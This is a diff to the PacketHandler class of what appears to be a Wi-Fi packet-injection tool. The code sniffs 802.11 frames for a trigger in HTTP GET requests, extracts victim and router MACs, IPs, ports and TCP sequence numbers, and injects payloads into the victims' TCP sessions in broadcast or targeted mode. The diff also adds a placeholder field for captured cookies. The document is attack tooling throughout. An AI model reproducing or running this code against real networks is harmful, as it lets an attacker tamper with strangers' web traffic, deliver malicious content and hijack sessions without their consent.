@@ -38,6 +38,7 @@ class PacketHandler(object):
         ## Argument handling
         args = keyword_parameters.get('Args')
         self.nic = args.mon
+        self.single = args.single
 
         ## Trigger setup
         if args.trigger is None:
@@ -59,24 +60,22 @@ class PacketHandler(object):
             request = self.requestExtractor(packet)
             if self.trigger in request:
 
-                ## airtun-ng
-                if args.tun is True:
-                    rtrmac = packet.getlayer(Ether).dst
-                    vicmac = packet.getlayer(Ether).src
-                    dstmac = None
+                ### DEBUG
+                # wrpcap('decryptedSniff.pcap', packet)
 
-                ## monitor mode
-                if self.nic == 'mon':
-                    if args.tun is False:
-                        rtrmac = packet.getlayer(Dot11).addr1
-                        vicmac = packet.getlayer(Dot11).addr2
-                        dstmac = packet.getlayer(Dot11).addr3
-                    else:
-                        rtrmac = packet.getlayer(Ether).dst
-                        vicmac = packet.getlayer(Ether).src
-                        dstmac = None
+                ## MONITOR MODE
+                # if self.nic == 'mon':
+                rtrmac = packet.getlayer(Dot11).addr1
+                vicmac = packet.getlayer(Dot11).addr2
+                dstmac = packet.getlayer(Dot11).addr3
 
-                ## all
+                # ## TAP MODE
+                # else:
+                #     rtrmac = packet.getlayer(Ether).dst
+                #     vicmac = packet.getlayer(Ether).src
+                #     dstmac = 'TAP'
+
+
                 vicip = packet.getlayer(IP).src
                 svrip = packet.getlayer(IP).dst
                 vicport = packet.getlayer(TCP).sport
@@ -84,6 +83,7 @@ class PacketHandler(object):
                 size = len(packet.getlayer(TCP).load)
                 acknum = str(int(packet.getlayer(TCP).seq) + size)
                 seqnum = packet.getlayer(TCP).ack
+                # wrpcap('inbound.pcap', packet)
             else:
                 return 0
 
@@ -93,7 +93,8 @@ class PacketHandler(object):
                 TSVal = None
                 TSecr = None
 
-            # print(vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, TSVal, TSecr)
+            cookie = None
+            #print (vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, TSVal, TSecr)
             return (vicmac,
                     rtrmac,
                     dstmac,
@@ -104,6 +105,7 @@ class PacketHandler(object):
                     acknum,
                     seqnum,
                     request,
+                    cookie,
                     TSVal,
                     TSecr)
         return None
@@ -120,6 +122,7 @@ class PacketHandler(object):
                        acknum,
                        seqnum,
                        request,
+                       cookie,
                        TSVal,
                        TSecr,
                        args):
@@ -133,43 +136,55 @@ class PacketHandler(object):
 
         Gutting some of the logic to concentrate on injection speed
         """
+
         ## Broadcast mode
         if len(self.victims) == 0:
 
             for victim in self.newvictims:
-                injection = victim.victim_parameters.file_inject
+                injection = victim.get_injection()
                 self.injector.inject(vicmac,
-                                     rtrmac,
-                                     dstmac,
-                                     vicip,
-                                     svrip,
-                                     vicport,
-                                     svrport,
-                                     acknum,
-                                     seqnum,
-                                     injection,
-                                     TSVal,
-                                     TSecr)
+                                    rtrmac,
+                                    dstmac,
+                                    vicip,
+                                    svrip,
+                                    vicport,
+                                    svrport,
+                                    acknum,
+                                    seqnum,
+                                    injection,
+                                    TSVal,
+                                    TSecr)
 
         ## Targeted mode
         else:
             for victim in self.victims:
-                injection = victim.victim_parameters.file_inject
+                injection = victim.get_injection()
                 self.injector.inject(vicmac,
-                                     rtrmac,
-                                     dstmac,
-                                     vicip,
-                                     svrip,
-                                     vicport,
-                                     svrport,
-                                     acknum,
-                                     seqnum,
-                                     injection,
-                                     TSVal,
-                                     TSecr)
+                                    rtrmac,
+                                    dstmac,
+                                    vicip,
+                                    svrip,
+                                    vicport,
+                                    svrport,
+                                    acknum,
+                                    seqnum,
+                                    injection,
+                                    TSVal,
+                                    TSecr)
 
     def process(self, interface, pkt, args):
-        """Process packets coming from the sniffer"""
+        """Process packets coming from the sniffer.
+
+        You can override the handler with one of your own,
+        that you can use for any other packet type (e.g DNS),
+        otherwise it uses the default packet handler looking
+        for GET requests for injection and cookies.
+        """
+        ## You can write your own handler for packets
+        ## If wanted, do something like:
+        #if self.handler is not None:
+            #self.handler(interface, pkt, args)
+        #else:
         try:
             vicmac,\
             rtrmac,\
@@ -181,6 +196,7 @@ class PacketHandler(object):
             acknum,\
             seqnum,\
             request,\
+            cookie,\
             TSVal,\
             TSecr = self.proc_handler(pkt, args)
 
@@ -190,6 +206,7 @@ class PacketHandler(object):
                             mac = vicmac,
                             victim_parameters = self.victim_parameters)
                 self.newvictims.append(v1)
+
             self.proc_injection(vicmac,
                                 rtrmac,
                                 dstmac,
@@ -200,6 +217,7 @@ class PacketHandler(object):
                                 acknum,
                                 seqnum,
                                 request,
+                                cookie,
                                 TSVal,
                                 TSecr,
                                 args)
@@ -211,6 +229,7 @@ class PacketHandler(object):
         """Extracts the payload for trigger processing"""
         ret2 = "\n".join(pkt.sprintf("{Raw:%Raw.load%}\n").split(r"\r\n"))
         if len(ret2.strip()) > 0:
+            # return ret2.translate(None, "'").strip()
             return ret2.replace("'", '').strip()
         else:
             return None
